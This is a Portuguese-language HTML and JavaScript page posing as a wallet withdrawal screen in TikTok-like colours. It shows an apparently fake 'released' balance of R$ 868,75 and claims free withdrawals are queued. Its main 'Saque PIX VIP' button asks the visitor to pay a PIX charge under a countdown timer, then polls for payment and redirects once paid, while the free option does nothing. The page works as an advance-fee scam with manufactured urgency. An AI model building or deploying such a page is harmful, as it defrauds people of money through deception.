<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Carteira - Saque</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto}
body{background:#f8f8f8;display:flex;justify-content:center}
.app-container{max-width:480px;width:100%;background:#fff;min-height:100vh}
.header{display:flex;justify-content:center;align-items:center;padding:16px;border-bottom:1px solid #eee}
.header h1{margin-left:10px;font-size:17px}
.balance-section{text-align:center;padding:40px 20px}
.balance-amount{font-size:42px;font-weight:700}
.status-badge{background:#e6f6ec;color:#0bba52;padding:6px 12px;border-radius:20px;font-size:12px;margin-top:10px;display:inline-block}
.notice{background:#fff9e6;border-left:4px solid #ffb700;padding:12px;margin:20px;font-size:13px}
.options-container{padding:20px;display:flex;flex-direction:column;gap:15px}
.option-card{border-radius:12px;padding:18px;cursor:pointer}
.card-instant{border:2px solid #000;box-shadow:4px 4px 0 #fe2c55,-4px -4px 0 #25f4ee}
.btn-instant{background:#fe2c55;color:#fff;padding:12px;border-radius:6px;text-align:center;margin-top:15px}
.card-normal{background:#f1f1f1;opacity:.7}
.btn-normal{border:1px solid #ccc;padding:12px;text-align:center;border-radius:6px;margin-top:15px}

/* MODAL */
#pixModal{
display:none;
position:fixed;
inset:0;
background:rgba(0,0,0,0.6);
z-index:999;
}

.modal-content{
background:#fff;
max-width:400px;
margin:50px auto;
padding:20px;
border-radius:12px;
text-align:center;
}

.copy-btn{
background:#fe2c55;
color:#fff;
border:none;
padding:12px;
width:100%;
border-radius:6px;
margin-top:15px;
}

.timer{
color:red;
font-size:13px;
margin-top:10px;
}
</style>
</head>

<body>

<div class="app-container">

<div class="header">
<h1>Carteira</h1>
</div>

<div class="balance-section">
<p>Saldo disponível</p>
<div class="balance-amount">R$ 868,75</div>
<div class="status-badge">✓ Liberado</div>
</div>

<div class="notice">
Alta demanda hoje. Saques gratuitos estão em fila.
</div>

<div class="options-container">

<!-- BOTÃO PRINCIPAL -->
<div class="option-card card-instant" onclick="gerarPix()">
<h2>⚡ Saque PIX VIP</h2>
<p>Receba em menos de 1 minuto</p>
<div class="btn-instant">Receber AGORA</div>
</div>

<div class="option-card card-normal">
<h2>⏳ Saque normal</h2>
<p>Até 7 dias úteis</p>
<div class="btn-normal">Aguardar</div>
</div>

</div>
</div>

<!-- MODAL PIX -->
<div id="pixModal">
<div class="modal-content">

<h3>Pague com PIX</h3>

<img id="qrCode" style="width:250px;margin:20px auto;">

<p id="pixCode" style="word-break:break-all;font-size:12px;"></p>

<button class="copy-btn" onclick="copiarPix()">Copiar código PIX</button>

<div class="timer" id="timer"></div>

<button onclick="fecharModal()" style="margin-top:10px">Fechar</button>

</div>
</div>

<script>
let transactionId = null;
let tempo = 600;

async function gerarPix(){
const res = await fetch("/api/criar-pix",{method:"POST"});
const data = await res.json();

if(!data.pixCode){
alert("Erro ao gerar PIX");
return;
}

transactionId = data.transactionId;

document.getElementById("qrCode").src =
"https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" + encodeURIComponent(data.pixCode);

document.getElementById("pixCode").innerText = data.pixCode;

document.getElementById("pixModal").style.display="block";

iniciarTimer();
verificarPagamento();
}

function copiarPix(){
navigator.clipboard.writeText(document.getElementById("pixCode").innerText);
alert("PIX copiado");
}

function fecharModal(){
document.getElementById("pixModal").style.display="none";
}

function iniciarTimer(){
const el = document.getElementById("timer");

const interval = setInterval(()=>{
tempo--;
let min = Math.floor(tempo/60);
let sec = tempo%60;

el.innerText = "Expira em: " + min + ":" + (sec<10?"0"+sec:sec);

if(tempo<=0){
clearInterval(interval);
el.innerText="PIX expirado";
}
},1000);
}

async function verificarPagamento(){
const interval = setInterval(async ()=>{

if(!transactionId) return;

const res = await fetch("/up1/api/status?transactionId="+transactionId);
const data = await res.json();

if(data.status==="COMPLETED"){
clearInterval(interval);

alert("Pagamento aprovado!");

window.location.href="/sucesso.html";
}

},3000);
}
</script>

</body>
</html>
